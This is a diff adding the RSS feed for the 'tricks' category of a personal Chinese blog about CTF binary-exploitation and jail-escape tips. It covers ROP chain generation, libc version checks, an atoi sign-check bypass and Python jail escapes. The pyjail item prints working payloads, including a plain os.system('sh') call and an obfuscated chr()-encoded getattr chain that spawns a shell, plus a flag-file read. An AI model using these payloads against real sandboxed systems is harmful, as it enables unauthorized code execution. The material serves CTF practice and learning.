@@ -1,0 +1,49 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>tricks on Peter Liu的个人博客</title>
+    <link>https://peterliuzhi.top/categories/tricks/</link>
+    <description>Recent content in tricks on Peter Liu的个人博客</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh</language>
+    <copyright>&amp;copy; 2023 &lt;a href=&#34;https://github.com/PeterLiu-all&#34;&gt;Peter Liu&lt;/a&gt;
+</copyright>
+    <lastBuildDate>Thu, 29 Dec 2022 03:01:44 +0800</lastBuildDate><atom:link href="https://peterliuzhi.top/categories/tricks/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>使用ROPgadget、ropper工具构建ropchain</title>
+      <link>https://peterliuzhi.top/tricks/%E4%BD%BF%E7%94%A8ropgadgetropper%E5%B7%A5%E5%85%B7%E6%9E%84%E5%BB%BAropchain/</link>
+      <pubDate>Thu, 29 Dec 2022 03:01:44 +0800</pubDate>
+      
+      <guid>https://peterliuzhi.top/tricks/%E4%BD%BF%E7%94%A8ropgadgetropper%E5%B7%A5%E5%85%B7%E6%9E%84%E5%BB%BAropchain/</guid>
+      <description>查看程序架构 ida伪代码 exp 这题手工构造ropchain比较困难，但是我们可以利用ropper或者ROPgadget的ropchain功能来生成： ropper ROPgadget exp</description>
+    </item>
+    
+    <item>
+      <title>如何查看当前系统libc版本</title>
+      <link>https://peterliuzhi.top/tricks/%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9Flibc%E7%89%88%E6%9C%AC/</link>
+      <pubDate>Wed, 28 Dec 2022 03:01:44 +0800</pubDate>
+      
+      <guid>https://peterliuzhi.top/tricks/%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9Flibc%E7%89%88%E6%9C%AC/</guid>
+      <description>如何查看当前系统libc版本 如何查看当前系统libc版本 查看当前系统的libc版本 查看程序当前默认使用的libc版本 查看当前系统的libc版本 strings /lib/x86_64-linux-gnu/libc.so.6 | grep</description>
+    </item>
+    
+    <item>
+      <title>绕过atoi前对首字符是否为负号的检查</title>
+      <link>https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87atoi%E5%89%8D%E5%AF%B9%E9%A6%96%E5%AD%97%E7%AC%A6%E6%98%AF%E5%90%A6%E4%B8%BA%E8%B4%9F%E5%8F%B7%E7%9A%84%E6%A3%80%E6%9F%A5/</link>
+      <pubDate>Tue, 27 Dec 2022 03:01:44 +0800</pubDate>
+      
+      <guid>https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87atoi%E5%89%8D%E5%AF%B9%E9%A6%96%E5%AD%97%E7%AC%A6%E6%98%AF%E5%90%A6%E4%B8%BA%E8%B4%9F%E5%8F%B7%E7%9A%84%E6%A3%80%E6%9F%A5/</guid>
+      <description>先输入空格就好了，atoi会跳过空格</description>
+    </item>
+    
+    <item>
+      <title>绕过pyjail——一句话RCE</title>
+      <link>https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87pyjail%E4%B8%80%E5%8F%A5%E8%AF%9Drce/</link>
+      <pubDate>Fri, 23 Dec 2022 03:01:44 +0800</pubDate>
+      
+      <guid>https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87pyjail%E4%B8%80%E5%8F%A5%E8%AF%9Drce/</guid>
+      <description>基础版 __import__(&amp;#39;os&amp;#39;).system(&amp;#39;sh&amp;#39;) 进阶版 getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) 如果知道flag文件的名字，可以用: open(chr(102)+chr(108)+chr(97)+chr(103)).read() 更多资料参见https://zhuanlan.zhihu.com/p/578986988</description>
+    </item>
+    
+  </channel>
+</rss>
